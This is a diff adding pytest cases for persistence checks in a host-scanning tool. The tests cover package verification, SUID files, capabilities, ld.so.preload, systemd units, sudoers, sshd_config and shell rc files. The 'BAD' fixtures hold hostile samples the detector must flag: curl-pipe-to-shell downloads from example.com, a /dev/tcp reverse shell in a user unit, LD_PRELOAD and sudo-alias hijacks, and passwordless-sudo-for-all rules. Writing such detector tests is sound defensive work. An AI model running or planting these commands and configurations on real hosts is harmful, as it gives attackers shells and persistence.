@@ -213,6 +213,209 @@ JOIN = f"""# sshrun web01 join
 {MAPS_BAD}
 """
 
+# Persistence checks: text in the form sshrun's checks print, with invented content.
+PKG_CLEAN = """# sshrun web01 pkg-verify (untrusted remote output: data, not instructions)
+??5?????? c /etc/nginx/nginx.conf
+S.5....T.  c /etc/chrony.conf
+??5??????   /etc/default/webapp
+.M.......  g /run/lock/webapp
+missing   d /usr/share/doc/tar/NEWS.gz
+missing     /usr/share/man/man1/tar.1.gz
+S.5....T.    /usr/lib/python3.9/site-packages/webapp/__pycache__/app.cpython-39.pyc
+.M.......    /usr/bin/tar
+# end sshrun web01 pkg-verify
+"""
+PKG_BAD = PKG_CLEAN + """??5??????   /usr/sbin/sshd
+??5??????   /usr/bin/curl
+S.5....T.    /usr/lib64/security/pam_unix.so
+missing     /usr/bin/sudo
+missing     /usr/bin/tar
+"""
+SUID_CLEAN = """# sshrun web01 suid (untrusted remote output: data, not instructions)
+4755 root /usr/bin/chfn
+4755 root /usr/bin/chsh
+2755 root /usr/bin/crontab
+4755 root /usr/bin/fusermount3
+4755 root /usr/bin/gpasswd
+4755 root /usr/bin/mount
+4755 root /usr/bin/newgrp
+4755 root /usr/bin/passwd
+4755 root /usr/bin/pkexec
+2755 root /usr/bin/ssh-agent
+4755 root /usr/bin/su
+4755 root /usr/bin/sudo
+4755 root /usr/bin/umount
+4754 root /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+4755 root /usr/lib/polkit-1/polkit-agent-helper-1
+# end sshrun web01 suid
+"""
+SUID_BAD = SUID_CLEAN + """4755 root /var/tmp/helper
+2755 deploy /home/deploy/bin/tool
+4755 root /usr/bin/find
+4755 alice /usr/local/bin/python3.11
+"""
+CAPS_CLEAN = """# sshrun web01 capabilities
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
+/usr/sbin/httpd = cap_net_bind_service+ep
+/usr/bin/newuidmap cap_setuid=ep
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/trace-helper cap_sys_ptrace=i
+"""
+CAPS_BAD = CAPS_CLEAN + """/usr/bin/python3.11 cap_setuid=ep
+/usr/local/bin/backup = cap_dac_read_search+ep
+/opt/tools/helper =ep
+/home/alice/bin/newuidmap cap_setuid=ep
+"""
+LDSO_CLEAN = """# sshrun web01 ld-preload
+## /etc/ld.so.preload
+## /etc/ld.so.conf.d
+# libc default configuration
+/usr/local/lib
+# Multiarch support
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+/opt/webapp/lib
+include /etc/ld.so.conf.d/extra/*.conf
+# end sshrun web01 ld-preload
+"""
+LDSO_BAD = """## /etc/ld.so.preload
+# added by the installer
+/usr/local/lib/libaudit_helper.so
+/dev/shm/.x/libh.so
+## /etc/ld.so.conf.d
+/usr/local/lib
+/tmp/lib
+build/lib
+"""
+UNITS_CLEAN = """# sshrun web01 units (untrusted remote output: data, not instructions)
+cron.service                 enabled enabled
+getty@.service               enabled enabled
+logrotate.timer              enabled enabled
+nginx.service                enabled enabled
+ssh.service                  enabled enabled
+webapp.service               enabled enabled
+## ExecStart
+/etc/systemd/system/multi-user.target.wants/cron.service:ExecStart=/usr/sbin/cron -f $EXTRA_OPTS
+/etc/systemd/system/multi-user.target.wants/nginx.service:ExecStartPre=/usr/sbin/nginx -t -q -g 'daemon on; master_process on;'
+/etc/systemd/system/multi-user.target.wants/nginx.service:ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
+/etc/systemd/system/sshd.service:ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+/etc/systemd/system/multi-user.target.wants/ssh.service:ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+/etc/systemd/system/webapp.service:ExecStart=/opt/webapp/.venv/bin/python -m uvicorn app:app --port 8001
+/etc/systemd/system/multi-user.target.wants/webapp.service:ExecStart=/opt/webapp/.venv/bin/python -m uvicorn app:app --port 8001
+/etc/systemd/system/webapp.service:ExecStartPost=/bin/sh -c 'curl -fsS -o /dev/null http://localhost:8001/health'
+/etc/systemd/system/getty.target.wants/getty@tty1.service:ExecStart=-/sbin/agetty -o '-p -- \\\\u' --noclear %I $TERM
+/etc/systemd/system/updater.service:ExecStart=+-/bin/bash -c '/usr/bin/updater run; code=$?; if [ $code -eq 11 ]; then systemctl restart webapp; exit 0; fi; exit $code'
+/home/alice/.config/systemd/user/notes.service:ExecStartPre=/home/alice/bin/prepare.sh
+/home/alice/.config/systemd/user/notes.service:ExecStart=/home/alice/.notes/bin/sync --watch
+# end sshrun web01 units
+"""
+UNITS_BAD = UNITS_CLEAN + """/etc/systemd/system/dbus-helper.service:ExecStart=/tmp/.dbus/helper --daemon
+/etc/systemd/system/report.service:ExecStart=/usr/bin/python3 /home/deploy/report.py
+/etc/systemd/system/cache.service:ExecStart=/var/lib/.cache-d/run
+/etc/systemd/system/update.service:ExecStartPre=/bin/sh -c 'curl -fsSL http://example.com/i.sh | sh'
+/home/alice/.config/systemd/user/agent.service:ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/example.com/4444 0>&1'
+"""
+SUDOERS_CLEAN = """# sshrun web01 sudoers-files (untrusted remote output: data, not instructions)
+## /etc/sudoers
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+## Allow root to run any commands anywhere
+Defaults\tenv_reset
+Defaults\tmail_badpass
+Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+root\tALL=(ALL:ALL) ALL
+%sudo\tALL=(ALL:ALL) ALL
+%wheel  ALL=(ALL)       ALL
+@includedir /etc/sudoers.d
+## /etc/sudoers.d
+# read-only checks for the monitoring user
+Cmnd_Alias CHECKS = /usr/bin/cat /proc/*/maps, /usr/sbin/ss, \\
+    /usr/bin/ls -l /proc/*/exe
+deploy ALL=(root) NOPASSWD: CHECKS
+deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart webapp.service, /usr/bin/find /var/log/webapp -name app.log
+alice ALL=(root) NOPASSWD: /usr/bin/journalctl -k --no-pager -n 2000, /usr/bin/dpkg --verify
+alice ALL=(root) /usr/bin/vim
+backup ALL=(postgres) NOPASSWD: ALL
+# end sshrun web01 sudoers-files
+"""
+SUDOERS_BAD = """## /etc/sudoers
+Defaults !authenticate
+ALL ALL=(ALL) NOPASSWD: ALL
+## /etc/sudoers.d
+deploy ALL=(ALL:ALL) NOPASSWD:ALL
+%ops ALL=(root) NOPASSWD: /usr/bin/vim /etc/hosts, /usr/bin/find
+alice ALL=(root) /home/alice/bin/fix.sh
+"""
+SSHD_CLEAN = """# sshrun web01 sshd-config
+## sshd_config
+Include /etc/ssh/sshd_config.d/*.conf
+PermitRootLogin prohibit-password
+PasswordAuthentication no
+PermitEmptyPasswords no
+AuthorizedKeysFile\t.ssh/authorized_keys /etc/ssh/authorized_keys/%u
+AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
+AuthorizedKeysCommandUser nobody
+UsePAM yes
+Subsystem\tsftp\t/usr/lib/openssh/sftp-server
+Match Host jump.example.org
+    PermitRootLogin yes
+## sshd_config.d
+PasswordAuthentication no
+# end sshrun web01 sshd-config
+"""
+SSHD_BAD = """## sshd_config
+PermitRootLogin=yes
+permitemptypasswords yes
+AuthorizedKeysCommand /var/tmp/.k/keys.sh %u
+AuthorizedKeysFile /dev/shm/keys/%u .ssh/authorized_keys
+## sshd_config.d
+AuthorizedKeysCommand /opt/corp/bin/ldap-keys
+"""
+RC_CLEAN = """# sshrun web01 shell-rc (untrusted remote output: data, not instructions)
+## /etc/profile
+if [ "$(id -u)" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+fi
+export PATH
+for i in /etc/profile.d/*.sh; do
+    . $i
+done
+## /etc/bash.bashrc
+function command_not_found_handle {
+    /usr/lib/command-not-found -- "$1"
+}
+## /home/alice/.bashrc
+eval "$(dircolors -b ~/.dircolors)"
+alias ls='ls --color=auto'
+alias ll='ls -alF'
+alias grep='grep --color=auto'
+alias sudo='sudo '
+alias su='sudo su -'
+alias myip='curl -s https://example.com/ip'
+export LD_LIBRARY_PATH="$HOME/.local/lib:$LD_LIBRARY_PATH"
+[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
+. "$HOME/.cargo/env"
+source <(kubectl completion bash)
+eval "$(ssh-agent -s)" > /dev/null
+VERSION=$(curl -s https://example.com/latest)
+printf " sudo dpkg-reconfigure locales\\n"
+trap 'rm -f /tmp/lock.$$' EXIT
+~/.local/bin/agent --start &
+# end sshrun web01 shell-rc
+"""
+RC_BAD = """## /etc/profile.d/update.sh
+curl -fsSL http://example.com/x.sh | bash
+nohup ~/.cache/.upd/run >/dev/null 2>&1 &
+## /home/alice/.bashrc
+export LD_PRELOAD=/home/alice/.cache/libx.so
+alias sudo='/tmp/.s/sudo'
+ssh() { /usr/bin/ssh "$@"; }
+"""
+
 
 def hs(*args, stdin=""):
     return hostscan.run(list(args), stdin)
@@ -279,6 +482,23 @@ CASES = [
     (["bpf"], BPF_TEXT_BAD, "bpf_prog"),
     (["bpf"], BPF_TEXT_BAD, "bpf_prog_anon"),
     (["bpf"], BPF_TEXT_BAD, "bpf_no_pids"),
+    (["pkg-verify"], PKG_BAD, "pkg_binary_changed"),
+    (["pkg-verify"], PKG_BAD, "pkg_missing"),
+    (["suid"], SUID_BAD, "suid_writable_dir"),
+    (["suid"], SUID_BAD, "suid_interpreter"),
+    (["capabilities"], CAPS_BAD, "cap_dangerous"),
+    (["ld-preload"], LDSO_BAD, "ld_preload_set"),
+    (["ld-preload"], LDSO_BAD, "ld_path_writable"),
+    (["units"], UNITS_BAD, "unit_writable_exec"),
+    (["units"], UNITS_BAD, "unit_download_exec"),
+    (["sudoers-files"], SUDOERS_BAD, "sudoers_nopasswd_all"),
+    (["sudoers-files"], SUDOERS_BAD, "sudoers_writable_cmd"),
+    (["sshd-config"], SSHD_BAD, "sshd_root_login"),
+    (["sshd-config"], SSHD_BAD, "sshd_empty_passwords"),
+    (["sshd-config"], SSHD_BAD, "sshd_keys_command"),
+    (["shell-rc"], RC_BAD, "rc_download_exec"),
+    (["shell-rc"], RC_BAD, "rc_ld_preload"),
+    (["shell-rc"], RC_BAD, "rc_alias_hijack"),
 ]
 
 
@@ -303,6 +523,9 @@ def test_every_rule_has_a_case_and_is_documented():
     (["bpf"], BPF_CLEAN), (["bpf"], "[]"), (["probes"], PROBES_CLEAN),
     (["ps"], PS_EF_CLEAN), (["ps"], PS_AUX_CLEAN), (["netstat"], NETSTAT_CLEAN), (["lsof"], LSOF_CLEAN),
     (["lsof"], LSOF_GENERAL_CLEAN),
+    (["pkg-verify"], PKG_CLEAN), (["suid"], SUID_CLEAN), (["capabilities"], CAPS_CLEAN), (["ld-preload"], LDSO_CLEAN),
+    (["units"], UNITS_CLEAN), (["sudoers-files"], SUDOERS_CLEAN), (["sshd-config"], SSHD_CLEAN),
+    (["shell-rc"], RC_CLEAN),
 ])
 def test_clean_samples_have_no_flags(args, text):
     out = hs(*args, stdin=text)
@@ -448,7 +671,8 @@ def test_malformed_input():
     assert hs("bpf", stdin='[1, "x", {"id": 1, "type": "tracing", "pids": 5}]').endswith("1 flag(s)\n")
 
 
-SUBS = ["ps", "ss", "netstat", "lsof", "exes", "maps", "bpf", "probes", "join"]
+PERSISTENCE = ["pkg-verify", "suid", "capabilities", "ld-preload", "units", "sudoers-files", "sshd-config", "shell-rc"]
+SUBS = ["ps", "ss", "netstat", "lsof", "exes", "maps", "bpf", "probes", "join"] + PERSISTENCE
 
 
 def test_argument_errors():
@@ -663,3 +887,199 @@ def test_quiet_prints_flags_and_a_count_not_the_table():
 def test_quiet_json_has_a_row_count_and_no_rows():
     out = json.loads(hs("ps", "-q", "-o", "json", stdin="1 0 root 500 /sbin/init\n"))
     assert out["rows"] == [] and out["row_count"] == 1
+
+
+# ── persistence checks ───────────────────────────────────────────────────────
+
+def severity_of(out: str, rule: str, subject: str) -> str:
+    return next(ln.split()[1] for ln in flags_of(out) if ln.split()[2] == rule and subject in ln)
+
+
+@pytest.mark.parametrize("sub, text, rule, subject, severity", [
+    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "/usr/sbin/sshd", "critical"),
+    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "/usr/bin/curl", "high"),
+    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "pam_unix.so", "critical"),
+    ("pkg-verify", PKG_BAD, "pkg_missing", "/usr/bin/sudo", "high"),
+    ("pkg-verify", PKG_BAD, "pkg_missing", "/usr/bin/tar", "medium"),
+    ("suid", SUID_BAD, "suid_writable_dir", "/var/tmp/helper", "critical"),
+    ("suid", SUID_BAD, "suid_writable_dir", "/home/deploy/bin/tool", "high"),
+    ("suid", SUID_BAD, "suid_interpreter", "/usr/bin/find", "critical"),
+    ("suid", SUID_BAD, "suid_interpreter", "python3.11", "high"),
+    ("capabilities", CAPS_BAD, "cap_dangerous", "/usr/bin/python3.11", "critical"),
+    ("capabilities", CAPS_BAD, "cap_dangerous", "/usr/local/bin/backup", "high"),
+    ("capabilities", CAPS_BAD, "cap_dangerous", "/opt/tools/helper", "high"),
+    ("capabilities", CAPS_BAD, "cap_dangerous", "/home/alice/bin/newuidmap", "critical"),
+    ("ld-preload", LDSO_BAD, "ld_preload_set", "libaudit_helper.so", "high"),
+    ("ld-preload", LDSO_BAD, "ld_preload_set", "/dev/shm/.x/libh.so", "critical"),
+    ("ld-preload", LDSO_BAD, "ld_path_writable", "/tmp/lib", "high"),
+    ("ld-preload", LDSO_BAD, "ld_path_writable", "build/lib", "high"),
+    ("units", UNITS_BAD, "unit_writable_exec", "dbus-helper.service", "high"),
+    ("units", UNITS_BAD, "unit_writable_exec", "report.service", "medium"),
+    ("units", UNITS_BAD, "unit_writable_exec", "cache.service", "high"),
+    ("units", UNITS_BAD, "unit_download_exec", "update.service", "high"),
+    ("units", UNITS_BAD, "unit_download_exec", "agent.service", "high"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "/etc/sudoers ALL", "critical"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "/etc/sudoers.d deploy", "high"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "Defaults", "medium"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/usr/bin/vim", "high"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/usr/bin/find", "high"),
+    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/home/alice/bin/fix.sh", "high"),
+    ("sshd-config", SSHD_BAD, "sshd_root_login", "/etc/ssh/sshd_config", "medium"),
+    ("sshd-config", SSHD_BAD, "sshd_empty_passwords", "/etc/ssh/sshd_config", "high"),
+    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/var/tmp/.k/keys.sh", "high"),
+    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/dev/shm/keys/%u", "high"),
+    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/opt/corp/bin/ldap-keys", "low"),
+    ("shell-rc", RC_BAD, "rc_download_exec", "/etc/profile.d/update.sh", "high"),
+    ("shell-rc", RC_BAD, "rc_ld_preload", "LD_PRELOAD", "high"),
+    ("shell-rc", RC_BAD, "rc_alias_hijack", ".bashrc sudo", "high"),
+    ("shell-rc", RC_BAD, "rc_alias_hijack", ".bashrc ssh", "medium"),
+])
+def test_persistence_severities(sub, text, rule, subject, severity):
+    assert severity_of(hs(sub, stdin=text), rule, subject) == severity
+
+
+def test_persistence_flag_counts_are_exact():
+    # every bad sample is its clean sample plus bad lines, so nothing else may fire
+    counts = {"pkg-verify": (PKG_BAD, 5), "suid": (SUID_BAD, 4), "capabilities": (CAPS_BAD, 4),
+              "ld-preload": (LDSO_BAD, 4), "units": (UNITS_BAD, 5), "sudoers-files": (SUDOERS_BAD, 6),
+              "sshd-config": (SSHD_BAD, 5), "shell-rc": (RC_BAD, 4)}
+    for sub, (text, want) in counts.items():
+        assert hs(sub, stdin=text).endswith(f"{want} flag(s)\n"), sub
+
+
+def test_persistence_rows_explain_what_was_not_flagged():
+    pkg = hs("pkg-verify", stdin=PKG_CLEAN)
+    assert "/etc/nginx/nginx.conf" in pkg and "config file, edited: not a flag" in pkg
+    assert "compiled Python cache" in pkg and "sshrun" not in pkg
+    caps = hs("capabilities", stdin=CAPS_CLEAN)
+    assert "cap_net_raw=ep" in caps and "shipped this way by the distribution" in caps
+    sshd = hs("sshd-config", stdin=SSHD_CLEAN)
+    assert "prohibit-password" in sshd and "a known directory-service helper" in sshd
+    assert "only inside the Match block" in sshd
+    units = hs("units", stdin=UNITS_CLEAN)
+    assert units.count("/opt/webapp/.venv/bin/python") == 1  # the .wants link and the unit file are one row
+    assert "notes.service" in units and "logrotate.timer" in units
+    rc = json.loads(hs("shell-rc", "-o", "json", stdin=RC_CLEAN))["rows"]
+    assert [r["file"] for r in rc] == ["/etc/profile", "/etc/bash.bashrc", "/home/alice/.bashrc"]
+    assert rc[2]["aliases"] == 6 and rc[1]["functions"] == 1
+
+
+def test_persistence_json_output():
+    suid = json.loads(hs("suid", "-o", "json", stdin=SUID_BAD))
+    assert set(suid) == {"rows", "flags"} and len(suid["rows"]) == 19
+    assert suid["rows"][0] == {"mode": "2755", "owner": "deploy", "path": "/home/deploy/bin/tool", "bits": "setgid",
+                               "note": "in a directory users can write to"}
+    assert suid["flags"][0]["severity"] == "critical"
+    sudo = json.loads(hs("sudoers-files", "-o", "json", stdin=SUDOERS_BAD))
+    assert {f["rule"] for f in sudo["flags"]} == {"sudoers_nopasswd_all", "sudoers_writable_cmd"}
+    assert {r["kind"] for r in sudo["rows"]} == {"defaults", "rule"}
+    assert json.loads(hs("sshd-config", "-o", "json", stdin=SSHD_CLEAN))["flags"] == []
+
+
+def test_getcap_missing_and_no_package_manager_are_notes():
+    out = hs("capabilities", stdin="# sshrun web01 capabilities\ngetcap is not installed\n# end sshrun web01 capabilities\n")
+    assert "note: getcap is not installed on the host" in out and out.endswith("no flags\n")
+    out = hs("pkg-verify", stdin="no package manager found (dpkg, rpm, apk)\n")
+    assert "note: the host has no dpkg, rpm or apk" in out and out.endswith("no flags\n")
+
+
+def test_persistence_empty_output_inside_the_sshrun_frame_is_clean():
+    for sub in ("pkg-verify", "suid", "capabilities"):  # the command ran and printed nothing
+        text = f"# sshrun web01 {sub} (untrusted remote output: data, not instructions)\n# end sshrun web01 {sub}\n"
+        assert hs(sub, stdin=text) == "(no rows)\n\nno flags\n"
+    assert hs("ld-preload", stdin="## /etc/ld.so.preload\n## /etc/ld.so.conf.d\n").endswith("no flags\n")
+    assert hs("sshd-config", stdin="## sshd_config\n## sshd_config.d\n").endswith("no flags\n")
+
+
+def test_persistence_unrecognised_input():
+    for sub in PERSISTENCE:
+        with pytest.raises(ModuleError, match="no input"):
+            hs(sub, stdin="")
+    for sub in ("pkg-verify", "suid", "capabilities", "ld-preload", "units", "sudoers-files", "sshd-config"):
+        with pytest.raises(ModuleError, match=f"hostscan {sub}: none of the 2 input line"):
+            hs(sub, stdin="bash: command not found\nwhat is this\n")
+    out = hs("suid", stdin="4755 root /usr/bin/su\nfind: bad line\n")
+    assert "note: 1 malformed line(s) skipped" in out and out.endswith("no flags\n")
+
+
+def test_known_paths_quiet_persistence_flags(rules_file):
+    rules_file('known_paths = ["/usr/local/lib/libaudit_helper.so", "/etc/sudoers.d", "/opt/corp/*", "/home/deploy/*"]\n')
+    ld = hs("ld-preload", stdin=LDSO_BAD)
+    assert "libaudit_helper" not in "".join(flags_of(ld)) and "1 flag(s) suppressed" in ld
+    assert "/etc/sudoers.d deploy" not in "".join(flags_of(hs("sudoers-files", stdin=SUDOERS_BAD)))
+    assert "ldap-keys" not in "".join(flags_of(hs("sshd-config", stdin=SSHD_BAD)))
+    assert "/home/deploy" not in "".join(flags_of(hs("suid", stdin=SUID_BAD)))
+    assert "report.service" not in "".join(flags_of(hs("units", stdin=UNITS_BAD)))
+
+
+@pytest.mark.parametrize("sub, text", [
+    ("sudoers-files", "USER ALL=(root) NOPASSWD: cat /sys/kernel/tracing/kprobe_events\n"
+                      "USER ALL=(root) NOPASSWD: grep -rh . /etc/sudoers.d\n"),
+    ("sudoers-files", "deploy ALL=(root) NOPASSWD: /usr/bin/python3 /opt/webapp/manage.py migrate\n"),
+    ("sudoers-files", "Defaults:deploy !requiretty\n%admin ALL=(ALL) ALL\n"),
+    ("sshd-config", "PermitRootLogin prohibit-password\nPermitRootLogin without-password\nPermitRootLogin no\n"
+                    "PermitRootLogin forced-commands-only\nAuthorizedKeysCommand none\n"),
+    ("sshd-config", "authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2\nAuthorizedKeysFile %h/.ssh/authorized_keys\n"),
+    ("shell-rc", "alias sudo='sudo '\nalias ssh='ssh -A'\nalias gpg=gpg2\n"),
+    ("shell-rc", "export IP=$(curl -s https://example.com/ip)\nwget -q -O ~/file.iso https://example.com/file.iso\n"),
+    ("shell-rc", "timeout 1 bash -c '</dev/tcp/localhost/5432' && echo up\necho 'see /tmp/x; /tmp/y'\n"),
+    ("units", "/home/alice/.config/systemd/user/a.service:ExecStart=/home/alice/.hidden/run\n"),
+    ("units", "/etc/systemd/system/a.service:ExecStart=/usr/bin/docker run --rm -v /tmp/data:/data app\n"),
+    ("units", "/etc/systemd/system/a.service:ExecStart=/bin/sh -c 'VERSION=$(curl -s http://localhost/v); exec /usr/bin/app'\n"),
+    ("capabilities", "/usr/bin/ping cap_net_raw=ep\n/usr/sbin/tcpdump cap_net_admin,cap_net_raw=eip\n"),
+    ("pkg-verify", "??5?????? c /etc/ssh/sshd_config\nmissing   c /etc/motd\n??5??????   /usr/share/webapp/index.html\n"),
+    ("ld-preload", "## /etc/ld.so.preload\n# nothing here\n## /etc/ld.so.conf.d\n/usr/lib64/atlas\n"),
+])
+def test_persistence_false_positive_guards(sub, text):
+    out = hs(sub, stdin=text)
+    assert out.endswith("no flags\n") and "FLAG" not in out
+
+
+def test_sshrun_sudoers_lines_are_not_flagged():
+    from modules import sshrun
+
+    assert hs("sudoers-files", stdin=sshrun.sudoers_for("web01")).endswith("no flags\n")
+
+
+def test_shell_rc_merges_hits_in_one_file_and_reads_a_plain_file():
+    out = hs("shell-rc", stdin=RC_BAD)
+    assert "rc_download_exec /etc/profile.d/update.sh" in out and "(and 1 more line(s))" in out
+    plain = hs("shell-rc", stdin="## My aliases\nPROMPT_COMMAND='/dev/shm/.p'\ntrap '/tmp/t.sh' DEBUG\n")
+    assert "rc_download_exec stdin" in plain and "(and 1 more line(s))" in plain
+
+
+def test_sshd_config_d_lines_with_a_file_name_in_front():
+    # grep over two or more files in sshd_config.d prints FILE: before each line; a Match ends with its file
+    text = ("# sshrun web01 sshd-config (untrusted remote output)\n## sshd_config\nPermitRootLogin no\n"
+            "## sshd_config.d\n/etc/ssh/sshd_config.d/10-git.conf:Match User git\n"
+            "/etc/ssh/sshd_config.d/10-git.conf:  PermitRootLogin yes\n"
+            "/etc/ssh/sshd_config.d/50-cloud.conf:PermitEmptyPasswords yes\n# end sshrun web01 sshd-config\n")
+    data = json.loads(hs("sshd-config", "-o", "json", stdin=text))
+    assert [(f["rule"], f["subject"], f["severity"]) for f in data["flags"]] == [
+        ("sshd_empty_passwords", "/etc/ssh/sshd_config.d/50-cloud.conf", "high")]
+    assert [r["match"] for r in data["rows"]] == ["", "User git", "User git", ""]
+
+
+def test_suid_files_in_rootless_container_storage_are_rows():
+    # podman and rootless docker unpack images under the user's home: su and mount in a layer keep their mode
+    store = "/home/alice/.local/share/containers/storage"
+    text = (f"4755 alice {store}/overlay/0123abcd/diff/usr/bin/su\n"
+            f"2755 100041 {store}/volumes/build_state/_data/snapshots/11/fs/usr/bin/chage\n"
+            f"4755 root {store}/overlay/0123abcd/diff/usr/bin/su\n")
+    data = json.loads(hs("suid", "-o", "json", stdin=text))
+    assert [(f["rule"], f["severity"]) for f in data["flags"]] == [("suid_writable_dir", "critical")]
+    assert [r["note"] for r in data["rows"]].count("in container storage, not owned by root") == 2
+
+
+def test_capabilities_that_sssd_ships_are_rows():
+    text = ("/usr/libexec/sssd/krb5_child cap_dac_read_search,cap_setgid,cap_setuid=p\n"
+            "/usr/libexec/sssd/ldap_child cap_dac_read_search=p\n/usr/libexec/sssd/selinux_child cap_setgid,cap_setuid=p\n"
+            "/usr/libexec/sssd/sssd_pam cap_dac_read_search=p\n")
+    assert hs("capabilities", stdin=text).endswith("no flags\n")
+    assert "cap_dangerous" in hs("capabilities", stdin=text.replace("/usr/libexec/sssd/", "/opt/tools/"))
+
+
+def test_pkg_verify_says_how_many_files_it_could_not_read():
+    text = "missing     /usr/bin/sudo (Permission denied)\n..?......    /usr/libexec/tool\n.M.......    /usr/bin/app\n"
+    out = hs("pkg-verify", "-q", stdin=text)
+    assert "note: 2 file(s) could not be read without root" in out and out.endswith("no flags in 3 row(s)\n")
